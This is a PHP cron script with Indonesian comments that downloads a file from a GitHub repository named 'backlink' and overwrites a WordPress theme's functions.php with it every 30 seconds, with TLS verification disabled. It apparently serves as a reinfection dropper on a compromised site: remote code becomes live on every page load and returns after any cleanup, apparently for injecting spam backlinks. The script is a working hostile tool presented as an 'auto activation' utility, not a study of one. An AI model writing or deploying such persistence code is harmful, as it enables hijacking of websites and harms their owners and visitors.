<?php
/**
 * Auto Activation Crontab Script
 * Upload file from GitHub to functions.php every 30 seconds
 */

// Konfigurasi
$source_url = "https://raw.githubusercontent.com/freyarion25/backlink/refs/heads/main/work-nih.txt";
$target_file = "/home/chiacundippal/public_html/web/wp-content/themes/experon/functions.php";
$log_file = "/home/chiacundippal/public_html/cli/cron-result.txt";

// Fungsi untuk menulis log
function writeLog($message, $log_file) {
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[$timestamp] $message" . PHP_EOL;
    file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
    echo $log_message;
}

// Fungsi untuk mendownload file dari URL
function downloadFile($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($http_code == 200 && !$error) {
        return $content;
    } else {
        return false;
    }
}

// Fungsi utama untuk menjalankan proses upload
function runUploadProcess($source_url, $target_file, $log_file) {
    writeLog("Memulai proses upload...", $log_file);
    
    // Download konten dari URL
    $content = downloadFile($source_url);
    
    if ($content === false) {
        writeLog("GAGAL: Tidak dapat mendownload file dari URL", $log_file);
        return false;
    }
    
    writeLog("Berhasil mendownload file (" . strlen($content) . " bytes)", $log_file);
    
    // Backup file functions.php yang ada (opsional)
    if (file_exists($target_file)) {
        $backup_file = $target_file . '.backup_' . date('Ymd_His');
        if (copy($target_file, $backup_file)) {
            writeLog("Backup file asli dibuat: " . basename($backup_file), $log_file);
        }
    }
    
    // Upload ke file target
    if (file_put_contents($target_file, $content, LOCK_EX)) {
        writeLog("SUKSES: File berhasil diupload ke " . $target_file, $log_file);
        
        // Set permission (jika diperlukan)
        chmod($target_file, 0644);
        
        return true;
    } else {
        writeLog("GAGAL: Tidak dapat menulis ke file target", $log_file);
        return false;
    }
}

// Eksekusi pertama
runUploadProcess($source_url, $target_file, $log_file);

// Untuk menjalankan setiap 30 detik, kita perlu menggunakan loop dengan sleep
// atau lebih baik menggunakan cron job terpisah

// Opsi 1: Loop internal dengan sleep (tidak direkomendasikan untuk produksi)
$enable_internal_loop = false; // Set ke true jika ingin menggunakan loop internal

if ($enable_internal_loop) {
    writeLog("Memulai loop internal 30 detik...", $log_file);
    while (true) {
        sleep(30); // Tunggu 30 detik
        runUploadProcess($source_url, $target_file, $log_file);
    }
} else {
    writeLog("Script selesai. Gunakan cron job untuk menjalankan setiap 30 detik.", $log_file);
    writeLog("Contoh cron: * * * * * php " . __FILE__ . " >/dev/null 2>&1", $log_file);
    writeLog("Kemudian tambahkan: * * * * * sleep 30; php " . __FILE__ . " >/dev/null 2>&1", $log_file);
}

?>
